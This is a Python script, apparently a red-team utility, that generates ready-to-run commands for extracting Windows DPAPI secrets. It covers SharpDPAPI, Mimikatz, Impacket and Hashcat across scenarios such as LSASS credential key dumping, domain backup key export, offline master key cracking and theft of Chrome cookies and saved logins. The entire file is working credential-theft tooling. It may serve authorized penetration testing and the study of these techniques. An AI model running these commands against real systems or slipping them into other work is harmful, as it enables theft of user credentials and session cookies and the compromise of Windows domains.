#!/usr/bin/env python3
"""DPAPI Command Generator

Generates ready-to-use commands for various DPAPI extraction scenarios.
"""

import argparse
import json
from pathlib import Path


def generate_sharpdpapi_command(
    method: str,
    target: str = None,
    password: str = None,
    ntlm_hash: str = None,
    credkey: str = None,
    pvk_file: str = None,
    server: str = None,
    use_rpc: bool = False,
    unprotect: bool = False,
    command_type: str = "triage"
) -> str:
    """Generate SharpDPAPI command."""
    
    cmd = ["SharpDPAPI.exe", command_type]
    
    if target:
        cmd.append(f"/target:{target}")
    
    if server:
        cmd.append(f"/server:{server}")
    
    if unprotect:
        cmd.append("/unprotect")
    
    if use_rpc:
        cmd.append("/rpc")
    
    if password:
        cmd.append(f"/password:{password}")
    
    if ntlm_hash:
        cmd.append(f"/ntlm:{ntlm_hash}")
    
    if credkey:
        cmd.append(f"/credkey:{credkey}")
    
    if pvk_file:
        cmd.append(f"/pvk:{pvk_file}")
    
    return " ".join(cmd)


def generate_mimikatz_command(
    operation: str,
    target_file: str = None,
    sid: str = None,
    password: str = None,
    ntlm_hash: str = None,
    masterkey: str = None,
    use_rpc: bool = False,
    dc_ip: str = None
) -> str:
    """Generate Mimikatz command."""
    
    if operation == "masterkey":
        cmd = ["dpapi::masterkey"]
        if target_file:
            cmd.append(f'/in:"{target_file}"')
        if sid:
            cmd.append(f"/sid:{sid}")
        if password:
            cmd.append(f"/password:{password}")
        if ntlm_hash:
            cmd.append(f"/ntlm:{ntlm_hash}")
        if use_rpc:
            cmd.append("/rpc")
        return " ".join(cmd)
    
    elif operation == "credential":
        cmd = ["dpapi::cred"]
        if target_file:
            cmd.append(f'/in:"{target_file}"')
        if masterkey:
            cmd.append(f"/masterkey:{masterkey}")
        return " ".join(cmd)
    
    elif operation == "backupkey":
        cmd = ["lsadump::backupkeys"]
        if dc_ip:
            cmd.append(f"/system:{dc_ip}")
        cmd.append("/export")
        return " ".join(cmd)
    
    elif operation == "lsadump":
        return "sekurlsa::dpapi"
    
    return ""


def generate_impacket_command(
    operation: str,
    file_path: str,
    sid: str = None,
    password: str = None,
    key: str = None
) -> str:
    """Generate Impacket dpapi.py command."""
    
    if operation == "masterkey":
        cmd = ["python3 dpapi.py masterkey", f"-file {file_path}"]
        if sid:
            cmd.append(f"-sid {sid}")
        if password:
            cmd.append(f"-password '{password}'")
        if key:
            cmd.append(f"-key 0x{key}")
        return " ".join(cmd)
    
    elif operation == "credential":
        cmd = ["python3 dpapi.py credential", f"-file {file_path}"]
        if key:
            cmd.append(f"-key 0x{key}")
        return " ".join(cmd)
    
    return ""


def generate_hashcat_command(
    hash_file: str,
    wordlist: str,
    mode: int = 22102,
    optimized: bool = True,
    workload: int = 4
) -> str:
    """Generate Hashcat command for DPAPI cracking."""
    
    cmd = [f"hashcat -m {mode}", hash_file, wordlist]
    
    if optimized:
        cmd.append("-O")
    
    cmd.append(f"-w{workload}")
    
    return " ".join(cmd)


def main():
    parser = argparse.ArgumentParser(description="Generate DPAPI extraction commands")
    parser.add_argument("--scenario", required=True, 
                       choices=["current-session", "offline-password", "offline-hash", 
                                "domain-backup", "lsass-credkey", "remote", "chrome-cookies"],
                       help="Extraction scenario")
    parser.add_argument("--tool", default="sharpdpapi",
                       choices=["sharpdpapi", "mimikatz", "impacket", "hashcat"],
                       help="Tool to use")
    parser.add_argument("--output", help="Output file for commands")
    
    # Scenario-specific arguments
    parser.add_argument("--target", help="Target file or folder")
    parser.add_argument("--password", help="User password")
    parser.add_argument("--ntlm", help="NTLM hash")
    parser.add_argument("--credkey", help="DPAPI credkey (SHA1)")
    parser.add_argument("--pvk", help="Domain backup key file")
    parser.add_argument("--server", help="Remote server")
    parser.add_argument("--sid", help="User SID")
    parser.add_argument("--browser", choices=["chrome", "edge", "firefox"], help="Browser for SharpChrome")
    
    args = parser.parse_args()
    
    commands = []
    
    if args.scenario == "current-session":
        if args.tool == "sharpdpapi":
            commands.append(generate_sharpdpapi_command("session", unprotect=True))
        elif args.tool == "mimikatz":
            commands.append(generate_mimikatz_command("lsadump"))
    
    elif args.scenario == "offline-password":
        if args.tool == "sharpdpapi":
            commands.append(generate_sharpdpapi_command(
                "password", target=args.target, password=args.password
            ))
        elif args.tool == "mimikatz":
            commands.append(generate_mimikatz_command(
                "masterkey", target_file=args.target, sid=args.sid, password=args.password
            ))
        elif args.tool == "impacket":
            commands.append(generate_impacket_command(
                "masterkey", file_path=args.target, sid=args.sid, password=args.password
            ))
    
    elif args.scenario == "offline-hash":
        if args.tool == "sharpdpapi":
            commands.append(generate_sharpdpapi_command(
                "hash", target=args.target, ntlm_hash=args.ntlm
            ))
        elif args.tool == "mimikatz":
            commands.append(generate_mimikatz_command(
                "masterkey", target_file=args.target, sid=args.sid, ntlm_hash=args.ntlm
            ))
        elif args.tool == "impacket":
            commands.append(generate_impacket_command(
                "masterkey", file_path=args.target, sid=args.sid, key=args.ntlm
            ))
    
    elif args.scenario == "domain-backup":
        if args.tool == "sharpdpapi":
            commands.append(generate_sharpdpapi_command(
                "pvk", target=args.target, pvk_file=args.pvk
            ))
        elif args.tool == "mimikatz":
            commands.append(generate_mimikatz_command("backupkey", dc_ip=args.server))
    
    elif args.scenario == "lsass-credkey":
        if args.tool == "sharpdpapi":
            commands.append(generate_sharpdpapi_command(
                "credkey", target=args.target, credkey=args.credkey
            ))
    
    elif args.scenario == "remote":
        if args.tool == "sharpdpapi":
            commands.append(generate_sharpdpapi_command(
                "remote", server=args.server, pvk_file=args.pvk
            ))
    
    elif args.scenario == "chrome-cookies":
        browser = args.browser or "chrome"
        commands.append(f"SharpChrome cookies /browser:{browser} /unprotect")
        commands.append(f"SharpChrome logins /browser:{browser} /unprotect")
    
    # Output commands
    output = json.dumps({"scenario": args.scenario, "tool": args.tool, "commands": commands}, indent=2)
    
    if args.output:
        Path(args.output).write_text(output)
        print(f"Commands saved to {args.output}")
    else:
        print(output)


if __name__ == "__main__":
    main()
